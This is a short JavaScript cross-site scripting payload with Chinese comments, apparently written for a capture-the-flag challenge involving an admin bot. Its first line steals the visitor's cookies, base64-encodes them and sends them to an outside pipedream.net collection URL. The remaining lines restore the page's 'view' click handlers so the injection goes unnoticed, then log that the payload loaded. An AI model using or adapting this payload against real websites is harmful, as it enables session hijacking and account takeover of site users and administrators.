// 1. 偷 Cookie (核心攻擊)
fetch('https://eos82zp0nc2qmhz.m.pipedream.net/?c=' + btoa(document.cookie));

// 2. 還原原本的 View 功能，讓 Admin 機器人能點進去
document.querySelectorAll('.view').forEach((e) => {
    e.addEventListener('click', () => {
        // 強制跳轉到詳細頁面（例如 /comment/875）
        window.location = `/comment/${e.id}`;
    });
});

console.log("Payload loaded and original View function restored.");
